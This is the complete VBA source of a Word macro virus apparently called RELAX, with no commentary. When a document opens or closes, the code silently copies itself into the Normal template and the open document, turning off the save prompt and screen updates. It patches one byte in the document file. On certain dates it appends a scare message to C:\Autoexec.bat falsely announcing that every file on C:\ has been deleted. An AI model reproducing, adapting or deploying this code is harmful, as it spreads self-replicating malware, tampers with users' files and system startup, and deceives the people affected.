   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'RELAX
   Private Sub RELAX2()
   If Day(Date) Mod 10 = 0 And Month(Date) Mod 4 = 0 Then
   Open "C:\Autoexec.bat" For Append As #1
   Print #1, "Cls"
   Print #1, "@ECHO OFF"
   Print #1, "ECHO NOTE!!!"
   Print #1, "ECHO ***"
   Print #1, "ECHO *****"
   Print #1, "ECHO *******"
   Print #1, "ECHO *****"
   Print #1, "ECHO ***"
   Print #1, "ECHO Sometimes you must RELAX."
   Print #1, "ECHO Please, RELAX while deleting all files in C:\"
   Print #1, "ECHO *****"
   Print #1, "ECHO *******"
   Print #1, "ECHO *****"
   Print #1, "ECHO GREECE"
   Print #1, "ECHO =================================="
   Print #1, "PAUSE"
   Print #1, "CLS"
   Print #1, "ECHO All files deleted!!!"
   Print #1, "ECHO Now, you have a clean COMPUTER."
   Print #1, "ECHO *******"
   Print #1, "ECHO *******"
   Print #1, "PAUSE"
   Print #1, "@ECHO ON"
   Close #1
   End If
   End Sub

   Private Sub Document_Close()
   Call GOODSub
   Call RELAX2
   End Sub

   Private Sub GOODSub()
   On Error Resume Next
   Application.ScreenUpdating = False
   Application.Options.SaveNormalPrompt = False
   x$ = "C:\temp.tmp"
   MacroContainer.VBProject.vbcomponents.Item("ThisDocument").Export x$
   Open x$ For Input As #1
   keimeno = Input(LOF(1), 1)
   Close #1
   kk& = InStr(1, keimeno, "'RELAX")
   keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
   For j = 1 To 2
   If j = 1 Then
   NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").Export x$
   Else
   ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").Export x$
   End If
   Open x$ For Input As #1
   rlx = Input(LOF(1), 1)
   Close #1
   d1 = InStr(1, rlx, "'RELAX")
   If d1 = 0 Then
   If j = 1 Then
   NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
   NormalTemplate.Save
   Else
   ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.InsertLines 1, keimeno
   End If
   End If
   Next j
   '====================
   Dim PRostasia As Byte
   PRostasia = 1
   fff = FreeFile
   If Dir(ActiveDocument.FullName, 6) <> "" Then
   Open ActiveDocument.FullName For Binary As #fff
   Put #fff, 862, PRostasia
   Close #fff
   ActiveDocument.Save
   End If
   Kill x$
   Application.ScreenUpdating = True
   End Sub

   Private Sub Document_Open()
   Call GOODSub
   End Sub
